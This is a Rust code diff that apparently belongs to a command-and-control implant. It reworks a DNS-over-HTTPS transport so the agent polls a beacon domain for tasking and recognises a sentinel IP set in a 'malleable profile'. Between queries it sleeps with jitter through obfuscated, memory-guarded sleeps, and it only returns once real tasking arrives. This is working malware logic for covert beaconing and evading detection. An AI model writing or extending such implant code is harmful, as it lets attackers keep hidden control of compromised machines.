@@ -267,40 +267,43 @@ impl Transport for DohTransport {
     }
 
     async fn recv(&mut self) -> Result<Message> {
-        // Beacon: A record query
-        let beacon_domain = format!("beacon.{:x}.{}", self.session_id, self.profile.host_header);
-        let json = self.execute_query(&beacon_domain, "A").await?;
+        // Beacon loop: query for tasking, sleep with jitter if none available,
+        // then retry.  Never return a synthetic message — block until real
+        // tasking arrives or an error occurs.
+        loop {
+            // Beacon: A record query
+            let beacon_domain =
+                format!("beacon.{:x}.{}", self.session_id, self.profile.host_header);
+            let json = self.execute_query(&beacon_domain, "A").await?;
 
-        // Check for a magic "tasking available" signal in the A record answer.
-        // A domain that always resolves (e.g., exists in DNS) will always have
-        // an Answer field, so we must look for a *specific* sentinel IP address
-        // to indicate that actual tasking is waiting.  The sentinel is
-        // configurable per malleable profile; any other answer — including
-        // legitimate CDN IPs — is treated as "no tasking".
-        let has_tasking = json
-            .get("Answer")
-            .and_then(|a| a.as_array())
-            .map(|arr| {
-                arr.iter().any(|r| {
-                    r.get("data")
-                        .and_then(|d| d.as_str())
-                        .map(|s| s.trim() == self.profile.doh_beacon_sentinel.as_str())
-                        .unwrap_or(false)
+            // Check for a magic "tasking available" signal in the A record answer.
+            // A domain that always resolves (e.g., exists in DNS) will always have
+            // an Answer field, so we must look for a *specific* sentinel IP address
+            // to indicate that actual tasking is waiting.  The sentinel is
+            // configurable per malleable profile; any other answer — including
+            // legitimate CDN IPs — is treated as "no tasking".
+            let has_tasking = json
+                .get("Answer")
+                .and_then(|a| a.as_array())
+                .map(|arr| {
+                    arr.iter().any(|r| {
+                        r.get("data")
+                            .and_then(|d| d.as_str())
+                            .map(|s| s.trim() == self.profile.doh_beacon_sentinel.as_str())
+                            .unwrap_or(false)
+                    })
                 })
-            })
-            .unwrap_or(false);
-        if !has_tasking {
+                .unwrap_or(false);
+
+            if has_tasking {
+                break;
+            }
+
+            // No tasking available — sleep for the configured jitter interval
+            // using the same obfuscated_sleep mechanism, then retry the beacon.
             let sleep_dur =
                 crate::obfuscated_sleep::calculate_jittered_sleep(&SleepConfig::default());
             crate::memory_guard::guarded_sleep(sleep_dur, None, 0).await?;
-            return Ok(Message::Heartbeat {
-                timestamp: std::time::SystemTime::now()
-                    .duration_since(std::time::UNIX_EPOCH)
-                    .unwrap_or_default()
-                    .as_secs(),
-                agent_id: self.agent_id.clone(),
-                status: "idle".to_string(),
-            });
         }
 
         // Fetch actual data via TXT record
